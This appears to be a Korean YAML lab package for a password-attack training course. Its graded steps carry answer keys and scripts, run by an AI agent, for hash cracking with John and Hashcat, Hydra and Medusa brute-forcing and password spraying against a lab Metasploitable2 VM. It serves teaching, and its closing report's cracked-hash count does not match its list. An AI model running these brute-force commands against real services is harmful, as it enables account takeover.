lab_id: battle-ai-week04
title: 패스워드 공격 — 크래킹, 브루트포스, 스프레이 (AI 지원)
version: ai
course: battle-ai
week: 4
description: 다양한 패스워드 공격 기법을 실습한다. 오프라인 해시 크래킹(John, Hashcat), 온라인 브루트포스(Hydra), 패스워드 스프레이 공격을 수행하며, 패스워드 보안의 중요성을 체득한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 해시 크래킹 도구(John, Hashcat)를 활용한 오프라인 공격을 수행한다
- Hydra를 이용한 온라인 브루트포스 공격을 실습한다
- 패스워드 정책과 방어 기법을 이해한다
prerequisites:
- 해시 함수 기초 (MD5, SHA)
- Linux 인증 구조 (/etc/passwd, /etc/shadow)
infra_requirements:
- Kali Linux VM (attacker)
- Metasploitable2 VM (target, 10.20.30.50)
pass_threshold: 0.6
steps:
- order: 1
  instruction: 다양한 해시 유형(MD5, SHA1, SHA256)의 샘플 해시를 생성하라.
  hint: echo -n과 md5sum, sha1sum, sha256sum을 사용한다.
  category: analysis
  points: 5
  answer: echo -n 'password123' | md5sum && echo -n 'password123' | sha1sum && echo -n 'password123' | sha256sum
  answer_detail: echo -n은 줄바꿈 없이 문자열을 출력한다. 같은 평문이라도 해시 알고리즘에 따라 완전히 다른 해시값이 생성된다. MD5는 32자, SHA1은 40자, SHA256은 64자의 16진수 문자열을 출력한다.
  verify:
    type: output_contains
    expect: 482c811da5d5b4bc6d497ffa98491e38
    field: stdout
  target_vm: attacker
  script: echo -n 'password123' | md5sum && echo -n 'password123' | sha1sum && echo -n 'password123' | sha256sum
  risk_level: low
- order: 2
  instruction: Week 3에서 추출한 DVWA 사용자 패스워드 해시를 John the Ripper용 파일로 준비하라.
  hint: user:hash 형식의 파일을 생성한다.
  category: exploit
  points: 10
  answer: 'cat > /tmp/dvwa_hashes.txt << ''EOF''

    admin:5f4dcc3b5aa765d61d8327deb882cf99

    gordonb:e99a18c428cb38d5f260853678922e03

    1337:8d3533d75ae2c3966d7e0d4fcc69216b

    pablo:0d107d09f5bbe40cade3de5c71e9e9b7

    smithye:5f4dcc3b5aa765d61d8327deb882cf99

    EOF'
  answer_detail: John the Ripper는 user:hash 형식의 입력을 기대한다. DVWA의 패스워드 해시는 MD5(unsalted)로, 현대 기준으로는 매우 취약하다. 실무에서는 bcrypt, scrypt 등 솔트+스트레칭이 필수이다.
  verify:
    type: file_exists
    expect: /tmp/dvwa_hashes.txt
    field: filesystem
  target_vm: attacker
  script: 'cat > /tmp/dvwa_hashes.txt << ''EOF''

    admin:5f4dcc3b5aa765d61d8327deb882cf99

    gordonb:e99a18c428cb38d5f260853678922e03

    1337:8d3533d75ae2c3966d7e0d4fcc69216b

    pablo:0d107d09f5bbe40cade3de5c71e9e9b7

    smithye:5f4dcc3b5aa765d61d8327deb882cf99

    EOF'
  risk_level: medium
- order: 3
  instruction: John the Ripper의 기본 워드리스트로 해시 크래킹을 시도하라.
  hint: john 명령에 --format=raw-md5 옵션을 지정한다.
  category: exploit
  points: 10
  answer: john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/dvwa_hashes.txt
  answer_detail: John the Ripper는 워드리스트의 각 단어를 해시하여 대상 해시와 비교한다. rockyou.txt는 1,400만개 이상의 실제 유출 패스워드를 포함한 가장 유명한 워드리스트이다. --format으로 해시 유형을 지정해야 정확한 크래킹이 가능하다.
  verify:
    type: output_contains
    expect: Loaded
    field: stdout
  target_vm: attacker
  script: john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/dvwa_hashes.txt
  risk_level: medium
- order: 4
  instruction: 크래킹 결과를 확인하라.
  hint: john --show 옵션을 사용한다.
  category: exploit
  points: 10
  answer: john --show --format=raw-md5 /tmp/dvwa_hashes.txt
  answer_detail: --show 옵션은 이미 크래킹된 해시의 결과를 표시한다. John은 크래킹 결과를 ~/.john/john.pot 파일에 저장하며, 같은 해시는 다시 크래킹하지 않는다.
  verify:
    type: output_contains
    expect: password
    field: stdout
  target_vm: attacker
  script: john --show --format=raw-md5 /tmp/dvwa_hashes.txt
  risk_level: medium
- order: 5
  instruction: John the Ripper의 규칙 기반 공격(rule-based attack)으로 변형 패스워드를 크래킹하라.
  hint: --rules 옵션을 추가한다.
  category: exploit
  points: 10
  answer: john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 /tmp/dvwa_hashes.txt
  answer_detail: 규칙 기반 공격은 워드리스트의 각 단어에 변형 규칙(대소문자, 숫자 추가, 치환 등)을 적용한다. best64 규칙은 가장 효과적인 64개 변형 규칙을 포함한다. 'password' → 'Password1', 'p@ssw0rd' 등을 자동 생성한다.
  verify:
    type: output_contains
    expect: rules
    field: stdout
  target_vm: attacker
  script: john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 /tmp/dvwa_hashes.txt
  risk_level: medium
- order: 6
  instruction: Hashcat을 사용하여 MD5 해시를 크래킹하라.
  hint: hashcat -m 0 (MD5 모드)을 사용한다.
  category: exploit
  points: 10
  answer: hashcat -m 0 -a 0 /tmp/dvwa_hashes.txt /usr/share/wordlists/rockyou.txt --force
  answer_detail: Hashcat은 GPU 가속을 지원하는 해시 크래킹 도구이다. -m 0은 MD5, -a 0은 사전 공격 모드이다. GPU가 있으면 CPU 대비 수십~수백 배 빠른 크래킹이 가능하다. --force는 GPU 없이 CPU로 강제 실행한다.
  verify:
    type: output_contains
    expect: Session
    field: stdout
  target_vm: attacker
  script: hashcat -m 0 -a 0 /tmp/dvwa_hashes.txt /usr/share/wordlists/rockyou.txt --force
  risk_level: medium
- order: 7
  instruction: Hydra를 사용하여 대상 SSH 서비스에 대한 온라인 브루트포스 공격을 수행하라.
  hint: hydra -l user -P wordlist ssh://target 형식을 사용한다.
  category: exploit
  points: 10
  answer: hydra -l msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.20.30.50 -t 4 -f
  answer_detail: Hydra는 온라인 패스워드 브루트포스 도구이다. -l은 단일 사용자명, -P는 패스워드 사전, -t 4는 동시 연결 수(너무 높으면 차단됨), -f는 첫 번째 성공 시 중지한다. SSH는 느리므로 스레드 수를 제한해야 한다.
  verify:
    type: output_contains
    expect: 'host:'
    field: stdout
  target_vm: attacker
  script: hydra -l msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.20.30.50 -t 4 -f
  risk_level: medium
- order: 8
  instruction: Hydra로 대상 FTP 서비스에 브루트포스 공격을 수행하라.
  hint: 프로토콜을 ftp로 변경한다.
  category: exploit
  points: 10
  answer: hydra -l msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://10.20.30.50 -t 4 -f
  answer_detail: FTP 브루트포스는 SSH보다 빠르게 진행된다. FTP는 평문 프로토콜이므로 네트워크 스니핑으로도 패스워드를 탈취할 수 있다. 방어 측에서는 fail2ban으로 반복 실패를 차단해야 한다.
  verify:
    type: output_contains
    expect: 'host:'
    field: stdout
  target_vm: attacker
  script: hydra -l msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://10.20.30.50 -t 4 -f
  risk_level: medium
- order: 9
  instruction: Hydra로 DVWA 웹 로그인 폼에 대한 브루트포스 공격을 수행하라.
  hint: hydra http-get-form 또는 http-post-form 모듈을 사용한다.
  category: exploit
  points: 10
  answer: 'hydra -l admin -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.20.30.50 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password
    incorrect:H=Cookie: security=low; PHPSESSID=test" -t 4 -f'
  answer_detail: http-get-form 모듈은 웹 폼 브루트포스를 수행한다. 형식은 'URL:BODY:FAIL_STRING'이다. ^USER^와 ^PASS^는 치환 마커이며, 실패 문자열로 성공/실패를 판별한다. H= 옵션으로 쿠키를 포함한다.
  verify:
    type: output_contains
    expect: hydra
    field: stdout
  target_vm: attacker
  script: 'hydra -l admin -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.20.30.50 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password
    incorrect:H=Cookie: security=low; PHPSESSID=test" -t 4 -f'
  risk_level: medium
- order: 10
  instruction: cewl 도구로 대상 웹사이트에서 커스텀 워드리스트를 생성하라.
  hint: cewl URL -w output.txt 형식을 사용한다.
  category: exploit
  points: 10
  answer: cewl http://10.20.30.50/ -w /tmp/custom_wordlist.txt -d 2 -m 5
  answer_detail: cewl은 웹사이트를 크롤링하여 페이지에 등장하는 단어로 워드리스트를 생성한다. -d는 크롤링 깊이, -m은 최소 단어 길이이다. 조직 고유 용어가 패스워드에 사용되는 경우가 많아 효과적이다.
  verify:
    type: file_exists
    expect: /tmp/custom_wordlist.txt
    field: filesystem
  target_vm: attacker
  script: cewl http://10.20.30.50/ -w /tmp/custom_wordlist.txt -d 2 -m 5
  risk_level: medium
- order: 11
  instruction: crunch 도구로 특정 패턴의 패스워드 사전을 생성하라. (6자리, 소문자+숫자)
  hint: crunch min max charset -o output 형식을 사용한다.
  category: exploit
  points: 10
  answer: crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 -o /tmp/brute_wordlist.txt -c 10000
  answer_detail: crunch는 지정한 문자 집합과 길이로 모든 조합을 생성한다. -c는 최대 출력 라인 수를 제한한다. 6자리 소문자+숫자는 약 21억 개의 조합이므로, 실무에서는 패턴을 좁혀야 한다.
  verify:
    type: file_exists
    expect: /tmp/brute_wordlist.txt
    field: filesystem
  target_vm: attacker
  script: crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 -o /tmp/brute_wordlist.txt -c 10000
  risk_level: medium
- order: 12
  instruction: 대상 시스템의 /etc/shadow 파일 형식을 분석하고, 해시 유형을 식별하라.
  hint: shadow 파일에서 $로 시작하는 해시 필드를 확인한다.
  category: analysis
  points: 10
  answer: 'cat > /tmp/shadow_sample.txt << ''EOF''

    root:$6$rounds=5000$salt$hash:18000:0:99999:7:::

    msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihDK1u.:14684:0:99999:7:::

    EOF

    cat /tmp/shadow_sample.txt'
  answer_detail: $1$은 MD5crypt, $5$은 SHA-256crypt, $6$은 SHA-512crypt를 의미한다. $6$rounds=5000은 해시 반복 횟수이다. 반복 횟수가 높을수록 크래킹이 어렵다. 최신 리눅스는 $6$(SHA-512)을 기본으로 사용한다.
  verify:
    type: output_contains
    expect: $
    field: stdout
  target_vm: attacker
  script: 'cat > /tmp/shadow_sample.txt << ''EOF''

    root:$6$rounds=5000$salt$hash:18000:0:99999:7:::

    msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihDK1u.:14684:0:99999:7:::

    EOF

    cat /tmp/shadow_sample.txt'
  risk_level: low
- order: 13
  instruction: 패스워드 스프레이 공격을 시뮬레이션하라. 여러 사용자에 대해 하나의 패스워드를 시도한다.
  hint: hydra -L userlist -p password 형식을 사용한다.
  category: exploit
  points: 10
  answer: echo -e 'root\nmsfadmin\nuser\nservice\npostgres' > /tmp/users.txt && hydra -L /tmp/users.txt -p msfadmin ssh://10.20.30.50 -t 4 -f
  answer_detail: 패스워드 스프레이는 하나의 패스워드를 여러 계정에 시도하는 기법이다. 계정 잠금을 우회하기 위해 사용되며, 'Password1', 'Summer2026' 같은 흔한 패스워드를 사용한다. -L은 사용자 목록 파일이다.
  verify:
    type: output_contains
    expect: 'host:'
    field: stdout
  target_vm: attacker
  script: echo -e 'root\nmsfadmin\nuser\nservice\npostgres' > /tmp/users.txt && hydra -L /tmp/users.txt -p msfadmin ssh://10.20.30.50 -t 4 -f
  risk_level: medium
- order: 14
  instruction: medusa를 사용하여 Telnet 서비스에 대한 병렬 브루트포스를 수행하라.
  hint: medusa -h host -u user -P wordlist -M telnet 형식을 사용한다.
  category: exploit
  points: 10
  answer: medusa -h 10.20.30.50 -u msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt -M telnet -t 4 -f
  answer_detail: Medusa는 Hydra와 유사한 온라인 브루트포스 도구이지만 모듈 구조로 설계되어 확장이 쉽다. -M은 프로토콜 모듈을 지정하며, telnet, ssh, ftp, http 등을 지원한다.
  verify:
    type: output_contains
    expect: ACCOUNT
    field: stdout
  target_vm: attacker
  script: medusa -h 10.20.30.50 -u msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt -M telnet -t 4 -f
  risk_level: medium
- order: 15
  instruction: 패스워드 공격 실습 결과를 종합하여 보고서를 작성하라. 크래킹된 패스워드 목록, 공격 소요 시간, 그리고 패스워드 정책 권고사항을 포함하라.
  hint: 각 공격 기법의 성공률과 소요 시간을 정리한다.
  category: analysis
  points: 15
  answer: 'cat > /tmp/password_attack_report.txt << ''EOF''

    === Password Attack Assessment Report ===


    Cracked Credentials:

    1. admin:password (MD5, < 1초)

    2. gordonb:abc123 (MD5, < 1초)

    3. pablo:letmein (MD5, < 1초)

    4. msfadmin:msfadmin (SSH brute, 2분)


    Attack Methods Used:

    - Offline cracking (John/Hashcat): 5/5 hashes cracked

    - Online bruteforce (Hydra): SSH, FTP, Telnet, HTTP

    - Password spraying: 1 account compromised


    Recommendations:

    1. Enforce minimum 12-char passwords with complexity

    2. Use bcrypt/scrypt instead of MD5 for hashing

    3. Implement account lockout after 5 failed attempts

    4. Deploy fail2ban on all network services

    5. Enable MFA for all user accounts

    6. Regular password audits with cracking tools

    EOF'
  answer_detail: 패스워드 공격 보고서는 크래킹된 계정의 위험도, 공격에 소요된 시간, 그리고 구체적인 정책 권고사항을 포함해야 한다. MD5 해시가 1초 이내에 크래킹되는 것을 보여주면 해시 알고리즘 교체의 필요성을 강력하게 설득할 수 있다.
  verify:
    type: file_exists
    expect: /tmp/password_attack_report.txt
    field: filesystem
  target_vm: attacker
  script: 'cat > /tmp/password_attack_report.txt << ''EOF''

    === Password Attack Assessment Report ===


    Cracked Credentials:

    1. admin:password (MD5, < 1초)

    2. gordonb:abc123 (MD5, < 1초)

    3. pablo:letmein (MD5, < 1초)

    4. msfadmin:msfadmin (SSH brute, 2분)


    Attack Methods Used:

    - Offline cracking (John/Hashcat): 5/5 hashes cracked

    - Online bruteforce (Hydra): SSH, FTP, Telnet, HTTP

    - Password spraying: 1 account compromised


    Recommendations:

    1. Enforce minimum 12-char passwords with complexity

    2. Use bcrypt/scrypt instead of MD5 for hashing

    3. Implement account lockout after 5 failed attempts

    4. Deploy fail2ban on all network services

    5. Enable MFA for all user accounts

    6. Regular password audits with cracking tools

    EOF'
  risk_level: low
